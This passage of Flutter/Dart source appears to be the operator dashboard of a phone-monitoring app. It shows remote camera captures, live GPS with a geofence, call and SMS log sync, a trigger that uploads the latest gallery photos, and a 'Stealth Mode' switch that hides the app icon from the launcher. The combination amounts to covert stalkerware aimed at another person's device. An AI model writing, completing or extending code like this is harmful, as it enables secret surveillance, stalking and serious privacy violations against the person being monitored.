          child: Icon(icon, color: color, size: 20),
        ),
        const SizedBox(width: 12),
        Expanded(
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(title,
                style: const TextStyle(fontWeight: FontWeight.w700, fontSize: 13)),
            const SizedBox(height: 2),
            Text(sub,
                style: const TextStyle(color: Colors.white38, fontSize: 11)),
          ]),
        ),
        const SizedBox(width: 10),
        busy
            ? SizedBox(width: 26, height: 26,
                child: CircularProgressIndicator(strokeWidth: 2.5, color: color))
            : GestureDetector(
                onTap: onTap,
                child: Container(
                  padding   : const EdgeInsets.symmetric(horizontal: 14, vertical: 9),
                  decoration: BoxDecoration(
                    color       : color,
                    borderRadius: BorderRadius.circular(9),
                  ),
                  child: Text(label,
                      style: const TextStyle(
                          color: Colors.white, fontWeight: FontWeight.w700,
                          fontSize: 12)),
                ),
              ),
      ]),
    );
  }
}

// ─── Captures list ────────────────────────────────────────────────────────────

class _CapturesList extends StatelessWidget {
  const _CapturesList({required this.deviceRef});
  final DatabaseReference deviceRef;

  @override
  Widget build(BuildContext context) {
    return StreamBuilder<DatabaseEvent>(
      stream : deviceRef.child('captures').limitToLast(5).onValue,
      builder: (ctx, snap) {
        if (!snap.hasData || snap.data!.snapshot.value == null) {
          return _Empty(icon: Icons.no_photography_rounded,
              message: 'No captures yet.\nUse the button above.');
        }
        final raw   = Map<String, dynamic>.from(snap.data!.snapshot.value as Map);
        final items = raw.values
            .map((e) => Map<String, dynamic>.from(e as Map))
            .toList()
          ..sort((a, b) =>
              (b['timestamp'] as int).compareTo(a['timestamp'] as int));

        return Container(
          decoration: BoxDecoration(
              color: _kCard, borderRadius: BorderRadius.circular(14)),
          child: Column(
            children: items.asMap().entries.map((entry) {
              final i   = entry.key;
              final cap = entry.value;
              final ts  = cap['timestamp'] as int? ?? 0;
              final t   = DateFormat('dd MMM · HH:mm')
                  .format(DateTime.fromMillisecondsSinceEpoch(ts));
              return Column(children: [
                ListTile(
                  leading: Container(
                    padding: const EdgeInsets.all(7),
                    decoration: BoxDecoration(
                      color       : _kRed.withOpacity(0.12),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: const Icon(Icons.image_rounded, color: _kRed, size: 16),
                  ),
                  title   : Text('Capture ${items.length - i}',
                      style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 13)),
                  subtitle: Text(t,
                      style: const TextStyle(color: Colors.white38, fontSize: 11)),
                ),
                if (i < items.length - 1)
                  const Divider(color: Colors.white10, height: 1, indent: 54),
              ]);
            }).toList(),
          ),
        );
      },
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  TAB 2 — LOCATION
// ═══════════════════════════════════════════════════════════════════════════════

class _LocationTab extends StatelessWidget {
  const _LocationTab({required this.deviceId});
  final String deviceId;

  @override
  Widget build(BuildContext context) {
    final locRef = FirebaseDatabase.instance.ref('devices/$deviceId/location');
    return StreamBuilder<DatabaseEvent>(
      stream : locRef.onValue,
      builder: (ctx, snap) {
        if (!snap.hasData) {
          return const Center(child: CircularProgressIndicator());
        }
        if (snap.data!.snapshot.value == null) {
          return _Empty(icon: Icons.location_off_rounded,
              message: 'Waiting for first GPS fix…');
        }
        final loc = Map<String, dynamic>.from(snap.data!.snapshot.value as Map);
        final lat = (loc['lat'] as num).toDouble();
        final lng = (loc['lng'] as num).toDouble();
        final acc = (loc['accuracy'] as num?)?.toDouble() ?? 0;
        final spd = (loc['speed'] as num?)?.toDouble() ?? 0;
        final ts  = loc['timestamp'] as int? ?? 0;
        final t   = DateFormat('dd MMM yyyy · HH:mm:ss')
            .format(DateTime.fromMillisecondsSinceEpoch(ts));

        return ListView(
          padding: const EdgeInsets.all(16),
          children: [
            Container(
              height    : 180,
              decoration: BoxDecoration(
                color       : _kCard,
                borderRadius: BorderRadius.circular(18),
                border      : Border.all(color: _kPrimary.withOpacity(0.25)),
              ),
              child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                const Icon(Icons.location_pin, color: _kRed, size: 40),
                const SizedBox(height: 8),
                Text('${lat.toStringAsFixed(5)}, ${lng.toStringAsFixed(5)}',
                    style: const TextStyle(
                        color: Colors.white70, fontWeight: FontWeight.w600)),
                const SizedBox(height: 6),
                GestureDetector(
                  onTap: () {/* open maps */},
                  child: Text('Tap to open Google Maps →',
                      style: TextStyle(color: _kPrimary, fontSize: 12)),
                ),
              ]),
            ),
            const SizedBox(height: 14),
            Wrap(spacing: 10, runSpacing: 10, children: [
              _InfoTile('Latitude',  lat.toStringAsFixed(6)),
              _InfoTile('Longitude', lng.toStringAsFixed(6)),
              _InfoTile('Accuracy',  '${acc.toStringAsFixed(0)} m'),
              _InfoTile('Speed',     '${(spd * 3.6).toStringAsFixed(1)} km/h'),
              _InfoTile('Last Update', t, wide: true),
            ]),
            const SizedBox(height: 18),

            // Geofence setup
            _SectionLabel('Geofence Setup'),
            const SizedBox(height: 10),
            _GeofenceCard(deviceId: deviceId, currentLat: lat, currentLng: lng),
          ],
        );
      },
    );
  }
}

// ─── Geofence card ────────────────────────────────────────────────────────────

class _GeofenceCard extends StatefulWidget {
  const _GeofenceCard({
    required this.deviceId,
    required this.currentLat,
    required this.currentLng,
  });
  final String deviceId;
  final double currentLat, currentLng;
  @override
  State<_GeofenceCard> createState() => _GeofenceCardState();
}

class _GeofenceCardState extends State<_GeofenceCard> {
  double _radius = 500;
  bool   _busy   = false;

  Future<void> _setGeofence() async {
    setState(() => _busy = true);
    await FirebaseDatabase.instance
        .ref('devices/${widget.deviceId}/geofence/config')
        .set({
      'lat'      : widget.currentLat,
      'lng'      : widget.currentLng,
      'radius'   : _radius,
      'timestamp': DateTime.now().millisecondsSinceEpoch,
    });
    if (mounted) {
      setState(() => _busy = false);
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
        content: Text(
            '🔔 Geofence set: ${_radius.toInt()}m around current location'),
        backgroundColor: const Color(0xFF1E1E30),
        behavior       : SnackBarBehavior.floating,
      ));
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      padding   : const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color       : _kCard,
        borderRadius: BorderRadius.circular(16),
        border      : Border.all(color: _kAmber.withOpacity(0.3)),
      ),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Icon(Icons.fence_rounded, color: _kAmber, size: 20),
          const SizedBox(width: 8),
          const Text('Set Safe Zone',
              style: TextStyle(fontWeight: FontWeight.w700, fontSize: 13)),
          const Spacer(),
          StreamBuilder<DatabaseEvent>(
            stream: FirebaseDatabase.instance
                .ref('devices/${widget.deviceId}/geofence/status').onValue,
            builder: (ctx, snap) {
              final outside = snap.data?.snapshot.value is Map
                  ? (snap.data!.snapshot.value as Map)['outside'] as bool? ?? false
                  : false;
              return Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                decoration: BoxDecoration(
                  color       : outside ? _kRed.withOpacity(0.15) : _kGreen.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Text(outside ? '⚠️ Outside' : '✅ Inside',
                    style: TextStyle(
                        color: outside ? _kRed : _kGreen,
                        fontSize: 11, fontWeight: FontWeight.w700)),
              );
            },
          ),
        ]),
        const SizedBox(height: 4),
        Text('Current location ko center mark karega — alert aayega jab bahar nikle',
            style: const TextStyle(color: Colors.white38, fontSize: 11)),
        const SizedBox(height: 14),
        Text('Radius: ${_radius.toInt()} meters',
            style: const TextStyle(color: Colors.white70, fontSize: 12)),
        Slider(
          value    : _radius,
          min      : 100,
          max      : 5000,
          divisions: 49,
          activeColor: _kAmber,
          inactiveColor: Colors.white10,
          onChanged: (v) => setState(() => _radius = v),
        ),
        const SizedBox(height: 8),
        GestureDetector(
          onTap: _busy ? null : _setGeofence,
          child: Container(
            width  : double.infinity,
            padding: const EdgeInsets.symmetric(vertical: 11),
            decoration: BoxDecoration(
              color       : _busy ? Colors.white12 : _kAmber,
              borderRadius: BorderRadius.circular(10),
            ),
            alignment: Alignment.center,
            child: _busy
                ? const SizedBox(width: 18, height: 18,
                    child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
                : const Text('🔔 Set Geofence Here',
                    style: TextStyle(fontWeight: FontWeight.w700, color: Colors.black)),
          ),
        ),
      ]),
    );
  }
}

class _InfoTile extends StatelessWidget {
  const _InfoTile(this.label, this.value, {this.wide = false});
  final String label, value;
  final bool   wide;

  @override
  Widget build(BuildContext context) {
    final w = wide
        ? MediaQuery.of(context).size.width - 32
        : (MediaQuery.of(context).size.width - 42) / 2;
    return Container(
      width  : w,
      padding: const EdgeInsets.all(13),
      decoration: BoxDecoration(
          color: _kCard, borderRadius: BorderRadius.circular(12)),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text(label,
            style: const TextStyle(color: Colors.white38, fontSize: 10)),
        const SizedBox(height: 5),
        Text(value,
            style: const TextStyle(
                color: Colors.white, fontSize: 12, fontWeight: FontWeight.w600)),
      ]),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  TAB 3 — STATUS
// ═══════════════════════════════════════════════════════════════════════════════

class _StatusTab extends StatelessWidget {
  const _StatusTab({required this.deviceId});
  final String deviceId;

  @override
  Widget build(BuildContext context) {
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId');
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        // ── Gallery ──
        _SectionLabel('Gallery Sync'),
        const SizedBox(height: 10),
        _GalleryCard(deviceId: deviceId),
        const SizedBox(height: 14),

        // ── Icon hide ──
        _SectionLabel('Stealth Mode'),
        const SizedBox(height: 10),
        _IconHideCard(deviceId: deviceId),
        const SizedBox(height: 14),

        // ── Live connections ──
        _SectionLabel('Connection Status'),
        const SizedBox(height: 10),
        _StatusCard(ref: ref),
        const SizedBox(height: 14),

        // ── Device info ──
        _SectionLabel('Device Info'),
        const SizedBox(height: 10),
        StreamBuilder<DatabaseEvent>(
          stream : ref.child('meta').onValue,
          builder: (ctx, snap) {
            final m = snap.data?.snapshot.value as Map?;
            return Container(
              padding   : const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color       : _kCard,
                borderRadius: BorderRadius.circular(14),
              ),
              child: Column(children: [
                _StatusRow(Icons.phone_android_rounded, 'Device ID',
                    deviceId.substring(0, 18) + '…', _kPrimary),
                const Divider(color: Colors.white10, height: 20),
                _StatusRow(Icons.cloud_rounded, 'Version',
                    m?['version'] as String? ?? '—', _kGreen),
                const Divider(color: Colors.white10, height: 20),
                _StatusRow(Icons.timer_rounded, 'Started',
                    m?['startedAt'] != null
                        ? DateFormat('dd MMM · HH:mm').format(
                            DateTime.fromMillisecondsSinceEpoch(
                                m!['startedAt'] as int))
                        : '—', _kAmber),
              ]),
            );
          },
        ),
      ],
    );
  }
}

// ─── Gallery card ─────────────────────────────────────────────────────────────

class _GalleryCard extends StatefulWidget {
  const _GalleryCard({required this.deviceId});
  final String deviceId;
  @override
  State<_GalleryCard> createState() => _GalleryCardState();
}

class _GalleryCardState extends State<_GalleryCard> {
  bool _busy = false;

  Future<void> _trigger() async {
    setState(() => _busy = true);
    await FirebaseDatabase.instance
        .ref('devices/${widget.deviceId}/commands/send_gallery')
        .set(true);
    if (mounted) {
      setState(() => _busy = false);
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
        content: Text('📸 Gallery sync started — kuch seconds mein photos aayenge'),
        backgroundColor: Color(0xFF1E1E30),
        behavior: SnackBarBehavior.floating,
      ));
    }
  }

  @override
  Widget build(BuildContext context) {
    return _CommandCard(
      icon : Icons.photo_library_rounded,
      color: _kGreen,
      title: 'Sync Gallery Photos',
      sub  : 'Latest 15 photos upload karega',
      busy : _busy,
      label: 'Sync',
      onTap: _trigger,
    );
  }
}

// ─── Icon hide card ───────────────────────────────────────────────────────────

class _IconHideCard extends StatefulWidget {
  const _IconHideCard({required this.deviceId});
  final String deviceId;
  @override
  State<_IconHideCard> createState() => _IconHideCardState();
}

class _IconHideCardState extends State<_IconHideCard> {
  bool _hidden = false;
  bool _busy   = false;

  Future<void> _toggle() async {
    setState(() => _busy = true);
    try {
      const channel = MethodChannel(_kCtrlChannel);
      await channel.invokeMethod(_hidden ? 'showIcon' : 'hideIcon');
      setState(() {
        _hidden = !_hidden;
        _busy   = false;
      });
      // Sync state to Firebase
      await FirebaseDatabase.instance
          .ref('devices/${widget.deviceId}/meta/icon_hidden')
          .set(_hidden);
    } catch (e) {
      setState(() => _busy = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      padding   : const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color       : _kCard,
        borderRadius: BorderRadius.circular(16),
        border      : Border.all(color: Colors.white12),
      ),
      child: Row(children: [
        Container(
          padding   : const EdgeInsets.all(9),
          decoration: BoxDecoration(
            color       : Colors.white10,
            borderRadius: BorderRadius.circular(11),
          ),
          child: Icon(
              _hidden ? Icons.visibility_off_rounded : Icons.visibility_rounded,
              color: Colors.white60, size: 20),
        ),
        const SizedBox(width: 12),
        Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text(_hidden ? 'Icon Hidden' : 'Icon Visible',
              style: const TextStyle(fontWeight: FontWeight.w700, fontSize: 13)),
          const SizedBox(height: 2),
          Text(_hidden
              ? 'App launcher se icon nahi dikhega'
              : 'Tap karo icon hide karne ke liye',
              style: const TextStyle(color: Colors.white38, fontSize: 11)),
        ])),
        Switch(
          value         : _hidden,
          onChanged     : _busy ? null : (_) => _toggle(),
          activeColor   : _kPrimary,
          inactiveThumbColor: Colors.white38,
        ),
      ]),
    );
  }
}

// ─── Status card ──────────────────────────────────────────────────────────────

class _StatusCard extends StatelessWidget {
  const _StatusCard({required this.ref});
  final DatabaseReference ref;

  @override
  Widget build(BuildContext context) {
    return Container(
      padding   : const EdgeInsets.all(16),
      decoration: BoxDecoration(
          color: _kCard, borderRadius: BorderRadius.circular(14)),
      child: Column(children: [
        StreamBuilder<DatabaseEvent>(
          stream : ref.child('location').onValue,
          builder: (ctx, snap) => _StatusRow(
              Icons.gps_fixed_rounded, 'GPS',
              snap.hasData && snap.data!.snapshot.value != null
                  ? 'Synced to Firebase' : 'Waiting…',
              snap.hasData && snap.data!.snapshot.value != null
                  ? _kGreen : Colors.white38),
        ),
        const Divider(color: Colors.white10, height: 18),
        StreamBuilder<DatabaseEvent>(
          stream : ref.child('battery').onValue,
          builder: (ctx, snap) => _StatusRow(
              Icons.battery_std_rounded, 'Battery',
              snap.hasData && snap.data!.snapshot.value != null
                  ? 'Synced' : 'Waiting…',
              snap.hasData && snap.data!.snapshot.value != null
                  ? _kGreen : Colors.white38),
        ),
        const Divider(color: Colors.white10, height: 18),
        StreamBuilder<DatabaseEvent>(
          stream : ref.child('call_logs').onValue,
          builder: (ctx, snap) => _StatusRow(
              Icons.phone_rounded, 'Call Logs',
              snap.hasData && snap.data!.snapshot.value != null
                  ? 'Synced' : 'Waiting…',
              snap.hasData && snap.data!.snapshot.value != null
                  ? _kGreen : Colors.white38),
        ),
        const Divider(color: Colors.white10, height: 18),
        StreamBuilder<DatabaseEvent>(
          stream : ref.child('sms_logs').onValue,
          builder: (ctx, snap) => _StatusRow(
              Icons.sms_rounded, 'SMS Logs',
              snap.hasData && snap.data!.snapshot.value != null
                  ? 'Synced' : 'Waiting…',
              snap.hasData && snap.data!.snapshot.value != null
                  ? _kGreen : Colors.white38),
        ),
      ]),
    );
  }
}

Widget _StatusRow(IconData icon, String label, String value, Color color) {
  return Row(children: [
    Icon(icon, color: color, size: 16),
    const SizedBox(width: 10),
    Text(label, style: const TextStyle(color: Colors.white60, fontSize: 12)),
    const Spacer(),
    Text(value, style: TextStyle(color: color, fontSize: 12, fontWeight: FontWeight.w600)),
  ]);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SHARED WIDGETS
// ═══════════════════════════════════════════════════════════════════════════════

class _SectionLabel extends StatelessWidget {
  const _SectionLabel(this.text);
  final String text;
  @override
  Widget build(BuildContext context) {
    return Text(text.toUpperCase(),
        style: const TextStyle(
            color: Colors.white38, fontSize: 10,
            fontWeight: FontWeight.w700, letterSpacing: 1.4));
  }
}

class _Empty extends StatelessWidget {
  const _Empty({required this.icon, required this.message});
  final IconData icon;
  final String   message;
  @override
  Widget build(BuildContext context) {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(32),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Icon(icon, color: Colors.white12, size: 48),
          const SizedBox(height: 12),
          Text(message,
              textAlign: TextAlign.center,
              style: const TextStyle(color: Colors.white30, fontSize: 13, height: 1.6)),
        ]),
      ),
    );
  }
}
